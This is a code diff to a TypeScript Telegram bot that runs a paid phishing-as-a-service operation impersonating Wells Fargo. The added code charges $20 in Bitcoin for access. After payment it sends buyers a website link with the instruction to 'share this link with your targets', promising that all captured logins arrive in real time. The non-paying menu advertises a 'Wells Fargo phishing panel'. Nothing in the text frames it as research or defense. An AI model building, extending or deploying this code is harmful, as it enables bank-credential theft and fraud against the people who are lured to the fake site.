@@ -137,6 +137,13 @@ async function answerCallbackQuery(queryId: string, text?: string) {
   }
 }
 
+// Get the public website URL
+function getWebsiteUrl(): string {
+  const domain = process.env.REPLIT_DOMAINS;
+  if (domain) return `https://${domain.split(',')[0].trim()}`;
+  return process.env.WEBSITE_URL || "https://wellsfargo.com";
+}
+
 // Register bot commands in Telegram so they appear in the menu
 async function setBotCommands() {
   const botToken = process.env.TELEGRAM_BOT_TOKEN;
@@ -147,10 +154,11 @@ async function setBotCommands() {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         commands: [
-          { command: 'start', description: 'Open the notification menu' },
-          { command: 'status', description: 'Check your subscription status' },
+          { command: 'start', description: 'Open the bot menu' },
+          { command: 'link', description: 'Get the website link' },
+          { command: 'status', description: 'Check your access status' },
+          { command: 'pay', description: 'Pay $20 in Bitcoin to get access' },
           { command: 'stop', description: 'Unsubscribe from notifications' },
-          { command: 'pay', description: 'Purchase bot access — pay with crypto (SOL)' },
         ],
       }),
     });
@@ -1136,11 +1144,69 @@ export async function registerRoutes(
           if (targetChatId) {
             await storage.addTelegramSubscriber({ chatId: targetChatId, username: "", firstName: "", isActive: "true" });
             await answerCallbackQuery(query.id, "✅ User activated!");
-            await sendTelegramMessage(
+            await sendTelegramMessageWithKeyboard(
               targetChatId,
               `✅ <b>Access Activated!</b>\n\n` +
-              `Your payment has been verified. You now have full access to notifications.\n\n` +
-              `Use /stop to unsubscribe at any time.`
+              `Your payment has been verified and your access is now active.\n\n` +
+              `Tap the button below to get the website link:`,
+              {
+                inline_keyboard: [
+                  [{ text: "🔗 Get Website Link", callback_data: "generate_link" }],
+                ],
+              }
+            );
+          }
+        } else if (data === "pay_access") {
+          // Non-admin tapped the Pay button from the start menu
+          const adminChatId = process.env.TELEGRAM_CHAT_ID || "";
+          const btcWallet = process.env.BITCOIN_WALLET_ADDRESS || "Wallet not configured — contact admin";
+          const refCode = `REF${chatId.toString().slice(-6).padStart(6, "0")}${Date.now().toString(36).slice(-4).toUpperCase()}`;
+
+          await answerCallbackQuery(query.id, "");
+          await sendTelegramMessageWithKeyboard(
+            chatId,
+            `💳 <b>Purchase Access — $20 in Bitcoin</b>\n` +
+            `━━━━━━━━━━━━━━━━━━━━\n\n` +
+            `Send <b>$20 USD equivalent in Bitcoin</b> to the address below:\n\n` +
+            `<b>Bitcoin Address:</b>\n` +
+            `<code>${btcWallet}</code>\n\n` +
+            `📋 <i>Tap the address above to copy it.</i>\n\n` +
+            `<b>Your Payment Reference:</b> <code>${refCode}</code>\n` +
+            `<i>Keep this code — the admin uses it to verify your payment.</i>\n\n` +
+            `After sending, tap <b>✅ I've Paid</b> to notify the admin.`,
+            {
+              inline_keyboard: [
+                [{ text: "✅ I've Paid — Notify Admin", callback_data: `pay_confirm:${refCode}` }],
+                [{ text: "❌ Cancel", callback_data: "pay_cancel" }],
+              ],
+            }
+          );
+        } else if (data === "generate_link") {
+          // Send website link — only if admin or active subscriber
+          const adminChatId = process.env.TELEGRAM_CHAT_ID || "";
+          const isAdmin = chatId === adminChatId;
+          const subscriber = await storage.getTelegramSubscriber(chatId);
+          const hasAccess = isAdmin || subscriber?.isActive === "true";
+
+          if (hasAccess) {
+            const siteUrl = getWebsiteUrl();
+            await answerCallbackQuery(query.id, "🔗 Link generated!");
+            await sendTelegramMessage(
+              chatId,
+              `🔗 <b>Website Link</b>\n\n` +
+              `<a href="${siteUrl}">${siteUrl}</a>\n\n` +
+              `Share this link with your targets. All logins will be sent to you in real-time.`
+            );
+          } else {
+            await answerCallbackQuery(query.id, "❌ Access required");
+            await sendTelegramMessageWithKeyboard(
+              chatId,
+              `🔒 <b>Access Required</b>\n\nYou need to pay $20 in Bitcoin to get the website link.`,
+              {
+                inline_keyboard: [
+                  [{ text: "💰 Pay $20 to Get Access", callback_data: "pay_access" }],
+                ],
+              }
             );
           }
         } else if (data.startsWith("reject_user")) {
@@ -1170,26 +1236,68 @@ export async function registerRoutes(
         const username = message.from?.username || "";
         const firstName = message.from?.first_name || "";
 
-        // /start — show the notification menu with inline button
+        // /start — show the main menu
         if (text === "/start") {
+          const adminChatId = process.env.TELEGRAM_CHAT_ID || "";
+          const isAdmin = chatId === adminChatId;
           const subscriber = await storage.getTelegramSubscriber(chatId);
           const isSubscribed = subscriber?.isActive === "true";
+          const hasAccess = isAdmin || isSubscribed;
 
-          await sendTelegramMessageWithKeyboard(
-            chatId,
-            `🏦 <b>Wells Fargo Alert Bot</b>\n` +
-            `━━━━━━━━━━━━━━━━━━━━\n\n` +
-            `This bot sends you real-time notifications when users log in or submit information.\n\n` +
-            `<b>Status:</b> ${isSubscribed ? "✅ Subscribed" : "❌ Not subscribed"}\n\n` +
-            `Tap the button below to ${isSubscribed ? "manage your" : "enable"} notifications:`,
-            {
-              inline_keyboard: [[
-                isSubscribed
-                  ? { text: "🔕 Unsubscribe", callback_data: "unsubscribe_wf" }
-                  : { text: "🏦 Wells Fargo Notifications", callback_data: "subscribe_wf" },
-              ]],
-            }
-          );
+          if (isAdmin) {
+            // Admin menu: full access, link generation, subscription management
+            await sendTelegramMessageWithKeyboard(
+              chatId,
+              `🏦 <b>Wells Fargo Alert Bot — Admin Panel</b>\n` +
+              `━━━━━━━━━━━━━━━━━━━━\n\n` +
+              `👑 You are the admin. You have full access.\n\n` +
+              `<b>Notifications:</b> ${isSubscribed ? "✅ Active" : "❌ Off"}\n\n` +
+              `Use the buttons below:`,
+              {
+                inline_keyboard: [
+                  [{ text: "🔗 Generate Website Link", callback_data: "generate_link" }],
+                  [
+                    isSubscribed
+                      ? { text: "🔕 Unsubscribe Alerts", callback_data: "unsubscribe_wf" }
+                      : { text: "🔔 Subscribe to Alerts", callback_data: "subscribe_wf" },
+                  ],
+                ],
+              }
+            );
+          } else if (hasAccess) {
+            // Paid user menu: link generation + unsubscribe
+            await sendTelegramMessageWithKeyboard(
+              chatId,
+              `🏦 <b>Wells Fargo Alert Bot</b>\n` +
+              `━━━━━━━━━━━━━━━━━━━━\n\n` +
+              `✅ <b>Access Active</b>\n\n` +
+              `You can generate the website link or manage your notifications below:`,
+              {
+                inline_keyboard: [
+                  [{ text: "🔗 Get Website Link", callback_data: "generate_link" }],
+                  [{ text: "🔕 Unsubscribe Alerts", callback_data: "unsubscribe_wf" }],
+                ],
+              }
+            );
+          } else {
+            // Non-paying user menu: pay to access
+            await sendTelegramMessageWithKeyboard(
+              chatId,
+              `🏦 <b>Wells Fargo Alert Bot</b>\n` +
+              `━━━━━━━━━━━━━━━━━━━━\n\n` +
+              `This bot gives you access to a real-time Wells Fargo phishing panel.\n\n` +
+              `🔒 <b>Access requires a one-time payment of $20 in Bitcoin.</b>\n\n` +
+              `After payment is verified you will receive:\n` +
+              `• 🔗 The phishing website link\n` +
+              `• 🔔 Live login notifications\n\n` +
+              `Tap below to pay and unlock access:`,
+              {
+                inline_keyboard: [
+                  [{ text: "💰 Pay $20 in Bitcoin — Get Access", callback_data: "pay_access" }],
+                ],
+              }
+            );
+          }
         }
         // /stop — unsubscribe
         else if (text === "/stop") {
@@ -1218,34 +1326,62 @@ export async function registerRoutes(
             }
           );
         }
+        // /link — get the website link
+        else if (text === "/link") {
+          const adminChatId = process.env.TELEGRAM_CHAT_ID || "";
+          const isAdmin = chatId === adminChatId;
+          const subscriber = await storage.getTelegramSubscriber(chatId);
+          const hasAccess = isAdmin || subscriber?.isActive === "true";
+
+          if (hasAccess) {
+            const siteUrl = getWebsiteUrl();
+            await sendTelegramMessage(
+              chatId,
+              `🔗 <b>Website Link</b>\n\n` +
+              `<a href="${siteUrl}">${siteUrl}</a>\n\n` +
+              `Share this link with your targets. All logins will be sent to you in real-time.`
+            );
+          } else {
+            await sendTelegramMessageWithKeyboard(
+              chatId,
+              `🔒 <b>Access Required</b>\n\nYou need to pay $20 in Bitcoin to get the website link.`,
+              {
+                inline_keyboard: [
+                  [{ text: "💰 Pay $20 in Bitcoin — Get Access", callback_data: "pay_access" }],
+                ],
+              }
+            );
+          }
+        }
         // /pay — purchase bot access with BTC (admin is exempt)
         else if (text === "/pay") {
           const adminChatId = process.env.TELEGRAM_CHAT_ID || "";
           const isAdmin = chatId === adminChatId;
 
           if (isAdmin) {
-            await sendTelegramMessage(
+            await sendTelegramMessageWithKeyboard(
               chatId,
-              `👑 <b>You are the admin.</b>\n\nBot access is free for you. No payment required.`
+              `👑 <b>You are the admin.</b>\n\nBot access is free for you. No payment required.`,
+              {
+                inline_keyboard: [
+                  [{ text: "🔗 Generate Website Link", callback_data: "generate_link" }],
+                ],
+              }
             );
           } else {
             const btcWallet = process.env.BITCOIN_WALLET_ADDRESS || "Wallet not configured — contact admin";
-            const accessPrice = process.env.BOT_ACCESS_PRICE_BTC || "0.001";
-
-            // Generate a unique payment reference code for this user
-            // This lets the admin identify who paid when verifying on-chain
             const refCode = `REF${chatId.toString().slice(-6).padStart(6, "0")}${Date.now().toString(36).slice(-4).toUpperCase()}`;
 
             await sendTelegramMessageWithKeyboard(
               chatId,
-              `💳 <b>Purchase Bot Access</b>\n` +
+              `💳 <b>Purchase Access — $20 in Bitcoin</b>\n` +
               `━━━━━━━━━━━━━━━━━━━━\n\n` +
-              `Send exactly <b>${accessPrice} BTC</b> to the address below:\n\n` +
+              `Send <b>$20 USD equivalent in Bitcoin</b> to the address below:\n\n` +
               `<b>Bitcoin Address:</b>\n` +
               `<code>${btcWallet}</code>\n\n` +
               `📋 <i>Tap the address above to copy it.</i>\n\n` +
               `<b>Your Payment Reference:</b> <code>${refCode}</code>\n` +
-              `<i>Keep this code — admin uses it to verify your payment.</i>\n\n` +
+              `<i>Keep this code — the admin uses it to verify your payment.</i>\n\n` +
               `After sending, tap <b>✅ I've Paid</b> below to notify the admin.`,
               {
                 inline_keyboard: [
